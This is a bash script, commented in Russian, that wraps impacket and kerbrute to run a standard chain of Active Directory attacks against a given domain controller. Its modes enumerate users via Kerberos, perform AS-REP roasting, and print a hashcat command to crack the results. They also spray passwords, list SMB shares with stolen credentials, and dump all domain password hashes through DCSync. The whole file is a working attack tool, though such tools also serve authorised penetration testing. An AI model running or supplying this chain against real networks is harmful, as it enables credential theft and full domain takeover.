#!/usr/bin/env bash
# ad-attack.sh — обвязка над impacket/kerbrute: стандартная цепочка AD-атак одной командой.
# юзаж: ./ad-attack.sh <dc-ip> <domain> <mode> [args]
# режимы: users <userlist> | asrep <userlist> | spray <userlist> <passlist> | shares <user:pass> | dcsync <user:pass>
set -euo pipefail

DC="${1:?usage: ad-attack.sh DC_IP DOMAIN mode [args]}"
DOMAIN="${2:?domain?}"
MODE="${3:?mode?}"; shift 3

case "$MODE" in
  users)   # энумерация юзеров через Kerberos
    kerbrute userenum -dc "$DC" -d "$DOMAIN" "$1" --output valid-users.txt
    ;;
  asrep)   # ASREPRoast -> hashcat -m 18200
    impacket-GetNPUsers "$DOMAIN/" -no-pass -usersfile "$1" -dc-ip "$DC" -outputfile asrep.hashes
    echo "крякать: hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt"
    ;;
  spray)   # password spray через kerbrute (безопасный, ловит lockout сразу)
    kerbrute passwordspray -dc "$DC" -d "$DOMAIN" "$1" "$2"
    ;;
  shares)  # шары под кредами + grep на секреты
    impacket-smbclient "$DOMAIN/$1"@"$DC" -c 'shares'
    ;;
  dcsync)  # полный дамп хэшей домена
    impacket-secretsdump "$DOMAIN/$1"@"$DC"
    ;;
  *) echo "mode: users|asrep|spray|shares|dcsync" >&2; exit 1 ;;
esac
